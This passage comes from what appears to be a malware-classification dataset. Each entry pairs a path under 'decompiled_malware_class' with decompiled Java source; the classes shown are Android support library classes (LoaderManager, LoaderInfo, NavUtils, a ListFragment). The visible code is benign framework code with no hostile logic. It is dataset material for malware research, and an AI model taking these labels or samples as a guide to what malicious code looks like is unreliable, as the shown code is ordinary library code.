this.mStandardEmptyView=(TextView)root.findViewById(INTERNAL_EMPTY_ID);         if (this.mStandardEmptyView == null) {           this.mEmptyView=root.findViewById(R.id.empty);         }  else {           this.mStandardEmptyView.setVisibility(8);         }         this.mProgressContainer=root.findViewById(INTERNAL_PROGRESS_CONTAINER_ID);         this.mListContainer=root.findViewById(INTERNAL_LIST_CONTAINER_ID);         View rawListView=root.findViewById(R.id.list);         if (!(rawListView instanceof ListView)) {           if (rawListView == null) {             throw new RuntimeException(""Your content must have a ListView whose id attribute is 'android.R.id.list'"");           }           throw new RuntimeException(""Content has view with id attribute 'android.R.id.list' that is not a ListView class"");         }         this.mList=(ListView)rawListView;         if (this.mEmptyView != null) {           this.mList.setEmptyView(this.mEmptyView);         }  else         if (this.mEmptyText != null) {           this.mStandardEmptyView.setText(this.mEmptyText);           this.mList.setEmptyView(this.mStandardEmptyView);         }       }       this.mListShown=true;       this.mList.setOnItemClickListener(this.mOnClickListener);       if (this.mAdapter != null) {         ListAdapter adapter=this.mAdapter;         this.mAdapter=null;         setListAdapter(adapter);       }  else       if (this.mProgressContainer != null) {         setListShown(false,false);       }       this.mHandler.post(this.mRequestFocus);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\LoaderCallbacks.code","public interface LoaderCallbacks<D> {   Loader<D> onCreateLoader(  int i,  Bundle bundle);   void onLoadFinished(  Loader<D> loader,  D d);   void onLoaderReset(  Loader<D> loader); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\LoaderInfo.code","public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {   final Bundle mArgs;   LoaderManager.LoaderCallbacks<Object> mCallbacks;   Object mData;   boolean mDeliveredData;   boolean mDestroyed;   boolean mHaveData;   final int mId;   boolean mListenerRegistered;   Loader<Object> mLoader;   LoaderInfo mPendingLoader;   boolean mReportNextStart;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   public LoaderInfo(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callbacks){     this.mId=id;     this.mArgs=args;     this.mCallbacks=callbacks;   }   void start(){     if (this.mRetaining && this.mRetainingStarted) {       this.mStarted=true;       return;     }     if (!this.mStarted) {       this.mStarted=true;       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);       }       if (this.mLoader == null && this.mCallbacks != null) {         this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);       }       if (this.mLoader != null) {         if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);         }         if (!this.mListenerRegistered) {           this.mLoader.registerListener(this.mId,this);           this.mListenerRegistered=true;         }         this.mLoader.startLoading();       }     }   }   void retain(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);     }     this.mRetaining=true;     this.mRetainingStarted=this.mStarted;     this.mStarted=false;     this.mCallbacks=null;   }   void finishRetain(){     if (this.mRetaining) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);       }       this.mRetaining=false;       if (this.mStarted != this.mRetainingStarted && !this.mStarted) {         stop();       }     }     if (this.mStarted && this.mHaveData && !this.mReportNextStart) {       callOnLoadFinished(this.mLoader,this.mData);     }   }   void reportStart(){     if (this.mStarted && this.mReportNextStart) {       this.mReportNextStart=false;       if (this.mHaveData) {         callOnLoadFinished(this.mLoader,this.mData);       }     }   }   void stop(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);     }     this.mStarted=false;     if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {       this.mListenerRegistered=false;       this.mLoader.unregisterListener(this);       this.mLoader.stopLoading();     }   }   void destroy(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);     }     this.mDestroyed=true;     boolean needReset=this.mDeliveredData;     this.mDeliveredData=false;     if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);       }       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";       }       try {         this.mCallbacks.onLoaderReset(this.mLoader);       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }     this.mCallbacks=null;     this.mData=null;     this.mHaveData=false;     if (this.mLoader != null) {       if (this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);       }       this.mLoader.reset();     }     if (this.mPendingLoader != null) {       this.mPendingLoader.destroy();     }   }   @Override public void onLoadComplete(  Loader<Object> loader,  Object data){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);     }     if (this.mDestroyed) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");         return;       }       return;     }     if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");         return;       }       return;     }     LoaderInfo pending=this.mPendingLoader;     if (pending != null) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);       }       this.mPendingLoader=null;       LoaderManagerImpl.this.mLoaders.put(this.mId,null);       destroy();       LoaderManagerImpl.this.installLoader(pending);       return;     }     if (this.mData != data || !this.mHaveData) {       this.mData=data;       this.mHaveData=true;       if (this.mStarted) {         callOnLoadFinished(loader,data);       }     }     LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);     if (info != null && info != this) {       info.mDeliveredData=false;       info.destroy();       LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);     }     if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {       LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();     }   }   void callOnLoadFinished(  Loader<Object> loader,  Object data){     if (this.mCallbacks != null) {       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";       }       try {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));         }         this.mCallbacks.onLoadFinished(loader,data);         this.mDeliveredData=true;       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.mId);     sb.append("" : "");     DebugUtils.buildShortClassTag(this.mLoader,sb);     sb.append(""}}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mArgs="");     writer.println(this.mArgs);     writer.print(prefix);     writer.print(""mCallbacks="");     writer.println(this.mCallbacks);     writer.print(prefix);     writer.print(""mLoader="");     writer.println(this.mLoader);     if (this.mLoader != null) {       this.mLoader.dump(prefix + ""  "",fd,writer,args);     }     if (this.mHaveData || this.mDeliveredData) {       writer.print(prefix);       writer.print(""mHaveData="");       writer.print(this.mHaveData);       writer.print(""  mDeliveredData="");       writer.println(this.mDeliveredData);       writer.print(prefix);       writer.print(""mData="");       writer.println(this.mData);     }     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mReportNextStart="");     writer.print(this.mReportNextStart);     writer.print("" mDestroyed="");     writer.println(this.mDestroyed);     writer.print(prefix);     writer.print(""mRetaining="");     writer.print(this.mRetaining);     writer.print("" mRetainingStarted="");     writer.print(this.mRetainingStarted);     writer.print("" mListenerRegistered="");     writer.println(this.mListenerRegistered);     if (this.mPendingLoader != null) {       writer.print(prefix);       writer.println(""Pending Loader "");       writer.print(this.mPendingLoader);       writer.println("":"");       this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\LoaderManager.code","public abstract class LoaderManager { public interface LoaderCallbacks<D> {     Loader<D> onCreateLoader(    int i,    Bundle bundle);     void onLoadFinished(    Loader<D> loader,    D d);     void onLoaderReset(    Loader<D> loader);   }   public abstract void destroyLoader(  int i);   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract <D>Loader<D> getLoader(  int i);   public abstract <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public abstract <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public static void enableDebugLogging(  boolean enabled){     LoaderManagerImpl.DEBUG=enabled;   }   public boolean hasRunningLoaders(){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\LoaderManagerImpl.code","public class LoaderManagerImpl extends LoaderManager {   static boolean DEBUG=false;   static final String TAG=""LoaderManager"";   FragmentActivity mActivity;   boolean mCreatingLoader;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   final SparseArrayCompat<LoaderInfo> mLoaders=new SparseArrayCompat<>();   final SparseArrayCompat<LoaderInfo> mInactiveLoaders=new SparseArrayCompat<>(); public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {     final Bundle mArgs;     LoaderManager.LoaderCallbacks<Object> mCallbacks;     Object mData;     boolean mDeliveredData;     boolean mDestroyed;     boolean mHaveData;     final int mId;     boolean mListenerRegistered;     Loader<Object> mLoader;     LoaderInfo mPendingLoader;     boolean mReportNextStart;     boolean mRetaining;     boolean mRetainingStarted;     boolean mStarted;     public LoaderInfo(    int id,    Bundle args,    LoaderManager.LoaderCallbacks<Object> callbacks){       this.mId=id;       this.mArgs=args;       this.mCallbacks=callbacks;     }     void start(){       if (this.mRetaining && this.mRetainingStarted) {         this.mStarted=true;         return;       }       if (!this.mStarted) {         this.mStarted=true;         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);         }         if (this.mLoader == null && this.mCallbacks != null) {           this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);         }         if (this.mLoader != null) {           if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);           }           if (!this.mListenerRegistered) {             this.mLoader.registerListener(this.mId,this);             this.mListenerRegistered=true;           }           this.mLoader.startLoading();         }       }     }     void retain(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);       }       this.mRetaining=true;       this.mRetainingStarted=this.mStarted;       this.mStarted=false;       this.mCallbacks=null;     }     void finishRetain(){       if (this.mRetaining) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);         }         this.mRetaining=false;         if (this.mStarted != this.mRetainingStarted && !this.mStarted) {           stop();         }       }       if (this.mStarted && this.mHaveData && !this.mReportNextStart) {         callOnLoadFinished(this.mLoader,this.mData);       }     }     void reportStart(){       if (this.mStarted && this.mReportNextStart) {         this.mReportNextStart=false;         if (this.mHaveData) {           callOnLoadFinished(this.mLoader,this.mData);         }       }     }     void stop(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);       }       this.mStarted=false;       if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);         this.mLoader.stopLoading();       }     }     void destroy(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);       }       this.mDestroyed=true;       boolean needReset=this.mDeliveredData;       this.mDeliveredData=false;       if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);         }         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";         }         try {           this.mCallbacks.onLoaderReset(this.mLoader);         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }       this.mCallbacks=null;       this.mData=null;       this.mHaveData=false;       if (this.mLoader != null) {         if (this.mListenerRegistered) {           this.mListenerRegistered=false;           this.mLoader.unregisterListener(this);         }         this.mLoader.reset();       }       if (this.mPendingLoader != null) {         this.mPendingLoader.destroy();       }     }     @Override public void onLoadComplete(    Loader<Object> loader,    Object data){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);       }       if (this.mDestroyed) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");           return;         }         return;       }       if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");           return;         }         return;       }       LoaderInfo pending=this.mPendingLoader;       if (pending != null) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);         }         this.mPendingLoader=null;         LoaderManagerImpl.this.mLoaders.put(this.mId,null);         destroy();         LoaderManagerImpl.this.installLoader(pending);         return;       }       if (this.mData != data || !this.mHaveData) {         this.mData=data;         this.mHaveData=true;         if (this.mStarted) {           callOnLoadFinished(loader,data);         }       }       LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);       if (info != null && info != this) {         info.mDeliveredData=false;         info.destroy();         LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);       }       if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {         LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();       }     }     void callOnLoadFinished(    Loader<Object> loader,    Object data){       if (this.mCallbacks != null) {         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";         }         try {           if (LoaderManagerImpl.DEBUG) {             Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));           }           this.mCallbacks.onLoadFinished(loader,data);           this.mDeliveredData=true;         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.mId);       sb.append("" : "");       DebugUtils.buildShortClassTag(this.mLoader,sb);       sb.append(""}}"");       return sb.toString();     }     public void dump(    String prefix,    FileDescriptor fd,    PrintWriter writer,    String[] args){       writer.print(prefix);       writer.print(""mId="");       writer.print(this.mId);       writer.print("" mArgs="");       writer.println(this.mArgs);       writer.print(prefix);       writer.print(""mCallbacks="");       writer.println(this.mCallbacks);       writer.print(prefix);       writer.print(""mLoader="");       writer.println(this.mLoader);       if (this.mLoader != null) {         this.mLoader.dump(prefix + ""  "",fd,writer,args);       }       if (this.mHaveData || this.mDeliveredData) {         writer.print(prefix);         writer.print(""mHaveData="");         writer.print(this.mHaveData);         writer.print(""  mDeliveredData="");         writer.println(this.mDeliveredData);         writer.print(prefix);         writer.print(""mData="");         writer.println(this.mData);       }       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mReportNextStart="");       writer.print(this.mReportNextStart);       writer.print("" mDestroyed="");       writer.println(this.mDestroyed);       writer.print(prefix);       writer.print(""mRetaining="");       writer.print(this.mRetaining);       writer.print("" mRetainingStarted="");       writer.print(this.mRetainingStarted);       writer.print("" mListenerRegistered="");       writer.println(this.mListenerRegistered);       if (this.mPendingLoader != null) {         writer.print(prefix);         writer.println(""Pending Loader "");         writer.print(this.mPendingLoader);         writer.println("":"");         this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);       }     }   }   public LoaderManagerImpl(  FragmentActivity activity,  boolean started){     this.mActivity=activity;     this.mStarted=started;   }   public void updateActivity(  FragmentActivity activity){     this.mActivity=activity;   }   private LoaderInfo createLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     LoaderInfo info=new LoaderInfo(id,args,callback);     Loader<Object> loader=callback.onCreateLoader(id,args);     info.mLoader=loader;     return info;   }   private LoaderInfo createAndInstallLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     try {       this.mCreatingLoader=true;       LoaderInfo info=createLoader(id,args,callback);       installLoader(info);       return info;     }   finally {       this.mCreatingLoader=false;     }   }   void installLoader(  LoaderInfo info){     this.mLoaders.put(info.mId,info);     if (this.mStarted) {       info.start();     }   }   @Override public <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""initLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo == null) {       loaderInfo=createAndInstallLoader(i,bundle,loaderCallbacks);       if (DEBUG) {         Log.v(TAG,""  Created new loader "" + loaderInfo);       }     }  else {       if (DEBUG) {         Log.v(TAG,""  Re-using existing loader "" + loaderInfo);       }       loaderInfo.mCallbacks=loaderCallbacks;     }     if (loaderInfo.mHaveData && this.mStarted) {       loaderInfo.callOnLoadFinished(loaderInfo.mLoader,loaderInfo.mData);     }     return (Loader<D>)loaderInfo.mLoader;   }   @Override public <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""restartLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo != null) {       LoaderInfo loaderInfo2=this.mInactiveLoaders.get(i);       if (loaderInfo2 != null) {         if (loaderInfo.mHaveData) {           if (DEBUG) {             Log.v(TAG,""  Removing last inactive loader: "" + loaderInfo);           }           loaderInfo2.mDeliveredData=false;           loaderInfo2.destroy();           loaderInfo.mLoader.abandon();           this.mInactiveLoaders.put(i,loaderInfo);         }  else         if (!loaderInfo.mStarted) {           if (DEBUG) {             Log.v(TAG,""  Current loader is stopped; replacing"");           }           this.mLoaders.put(i,null);           loaderInfo.destroy();         }  else {           if (loaderInfo.mPendingLoader != null) {             if (DEBUG) {               Log.v(TAG,""  Removing pending loader: "" + loaderInfo.mPendingLoader);             }             loaderInfo.mPendingLoader.destroy();             loaderInfo.mPendingLoader=null;           }           if (DEBUG) {             Log.v(TAG,""  Enqueuing as new pending loader"");           }           loaderInfo.mPendingLoader=createLoader(i,bundle,loaderCallbacks);           return (Loader<D>)loaderInfo.mPendingLoader.mLoader;         }       }  else {         if (DEBUG) {           Log.v(TAG,""  Making last loader inactive: "" + loaderInfo);         }         loaderInfo.mLoader.abandon();         this.mInactiveLoaders.put(i,loaderInfo);       }     }     return (Loader<D>)createAndInstallLoader(i,bundle,loaderCallbacks).mLoader;   }   @Override public void destroyLoader(  int id){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     if (DEBUG) {       Log.v(TAG,""destroyLoader in "" + this + "" of ""+ id);     }     int idx=this.mLoaders.indexOfKey(id);     if (idx >= 0) {       LoaderInfo info=this.mLoaders.valueAt(idx);       this.mLoaders.removeAt(idx);       info.destroy();     }     int idx2=this.mInactiveLoaders.indexOfKey(id);     if (idx2 >= 0) {       LoaderInfo info2=this.mInactiveLoaders.valueAt(idx2);       this.mInactiveLoaders.removeAt(idx2);       info2.destroy();     }     if (this.mActivity != null && !hasRunningLoaders()) {       this.mActivity.mFragments.startPendingDeferredFragments();     }   }   @Override public <D>Loader<D> getLoader(  int i){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (loaderInfo != null) {       if (loaderInfo.mPendingLoader != null) {         return (Loader<D>)loaderInfo.mPendingLoader.mLoader;       }       return (Loader<D>)loaderInfo.mLoader;     }     return null;   }   public void doStart(){     if (DEBUG) {       Log.v(TAG,""Starting in "" + this);     }     if (this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,e);     }  else {       this.mStarted=true;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).start();       }     }   }   public void doStop(){     if (DEBUG) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,e);     }  else {       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).stop();       }       this.mStarted=false;     }   }   public void doRetain(){     if (DEBUG) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,e);     }  else {       this.mRetaining=true;       this.mStarted=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).retain();       }     }   }   public void finishRetain(){     if (this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.mRetaining=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).finishRetain();       }     }   }   public void doReportNextStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).mReportNextStart=true;     }   }   public void doReportStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).reportStart();     }   }   public void doDestroy(){     if (!this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).destroy();       }     }     if (DEBUG) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int i2=this.mInactiveLoaders.size() - 1; i2 >= 0; i2--) {       this.mInactiveLoaders.valueAt(i2).destroy();     }     this.mInactiveLoaders.clear();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     DebugUtils.buildShortClassTag(this.mActivity,sb);     sb.append(""}}"");     return sb.toString();   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     if (this.mLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Active Loaders:"");       String innerPrefix=prefix + ""    "";       for (int i=0; i < this.mLoaders.size(); i++) {         LoaderInfo li=this.mLoaders.valueAt(i);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mLoaders.keyAt(i));         writer.print("": "");         writer.println(li.toString());         li.dump(innerPrefix,fd,writer,args);       }     }     if (this.mInactiveLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Inactive Loaders:"");       String innerPrefix2=prefix + ""    "";       for (int i2=0; i2 < this.mInactiveLoaders.size(); i2++) {         LoaderInfo li2=this.mInactiveLoaders.valueAt(i2);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mInactiveLoaders.keyAt(i2));         writer.print("": "");         writer.println(li2.toString());         li2.dump(innerPrefix2,fd,writer,args);       }     }   }   @Override public boolean hasRunningLoaders(){     boolean loadersRunning=false;     int count=this.mLoaders.size();     for (int i=0; i < count; i++) {       LoaderInfo li=this.mLoaders.valueAt(i);       loadersRunning|=li.mStarted && !li.mDeliveredData;     }     return loadersRunning;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NavUtils.code","public class NavUtils {   private static final NavUtilsImpl IMPL;   public static final String PARENT_ACTIVITY=""android.support.PARENT_ACTIVITY"";   private static final String TAG=""NavUtils""; public interface NavUtilsImpl {     Intent getParentActivityIntent(    Activity activity);     String getParentActivityName(    Context context,    ActivityInfo activityInfo);     void navigateUpTo(    Activity activity,    Intent intent);     boolean shouldUpRecreateTask(    Activity activity,    Intent intent);   } static class NavUtilsImplBase implements NavUtilsImpl {     NavUtilsImplBase(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       String parentActivity=NavUtils.getParentActivityName(activity);       if (parentActivity == null) {         return null;       }       return new Intent().setClassName(activity,parentActivity);     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       String action=activity.getIntent().getAction();       return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       upIntent.addFlags(67108864);       activity.startActivity(upIntent);       activity.finish();     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String parentActivity;       if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {         if (parentActivity.charAt(0) == '.') {           return context.getPackageName() + parentActivity;         }         return parentActivity;       }       return null;     }   } static class NavUtilsImplJB extends NavUtilsImplBase {     NavUtilsImplJB(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent result=NavUtilsJB.getParentActivityIntent(activity);       if (result == null) {         return super.getParentActivityIntent(activity);       }       return result;     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       NavUtilsJB.navigateUpTo(activity,upIntent);     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String result=NavUtilsJB.getParentActivityName(info);       if (result == null) {         return super.getParentActivityName(context,info);       }       return result;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       IMPL=new NavUtilsImplJB();     }  else {       IMPL=new NavUtilsImplBase();     }   }   public static boolean shouldUpRecreateTask(  Activity sourceActivity,  Intent targetIntent){     return IMPL.shouldUpRecreateTask(sourceActivity,targetIntent);   }   public static void navigateUpFromSameTask(  Activity sourceActivity){     Intent upIntent=getParentActivityIntent(sourceActivity);     if (upIntent == null) {       throw new IllegalArgumentException(""Activity "" + sourceActivity.getClass().getSimpleName() + "" does not have a parent activity name specified. (Did you forget to add the android.support.PARENT_ACTIVITY <meta-data>  element in your manifest?)"");     }     navigateUpTo(sourceActivity,upIntent);   }   public static void navigateUpTo(  Activity sourceActivity,  Intent upIntent){     IMPL.navigateUpTo(sourceActivity,upIntent);   }   public static Intent getParentActivityIntent(  Activity sourceActivity){     return IMPL.getParentActivityIntent(sourceActivity);   }   public static Intent getParentActivityIntent(  Context context,  Class<?> sourceActivityClass) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,new ComponentName(context,sourceActivityClass));     if (parentActivity == null) {       return null;     }     return new Intent().setClassName(context,parentActivity);   }   public static Intent getParentActivityIntent(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,componentName);     if (parentActivity == null) {       return null;     }     return new Intent().setClassName(componentName.getPackageName(),parentActivity);   }   public static String getParentActivityName(  Activity sourceActivity){     try {       return getParentActivityName(sourceActivity,sourceActivity.getComponentName());     }  catch (    PackageManager.NameNotFoundException e) {       throw new IllegalArgumentException(e);     }   }   public static String getParentActivityName(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     PackageManager pm=context.getPackageManager();     ActivityInfo info=pm.getActivityInfo(componentName,128);     String parentActivity=IMPL.getParentActivityName(context,info);     return parentActivity;   }   private NavUtils(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NavUtilsImpl.code","public interface NavUtilsImpl {   Intent getParentActivityIntent(  Activity activity);   String getParentActivityName(  Context context,  ActivityInfo activityInfo);   void navigateUpTo(  Activity activity,  Intent intent);   boolean shouldUpRecreateTask(  Activity activity,  Intent intent); } "
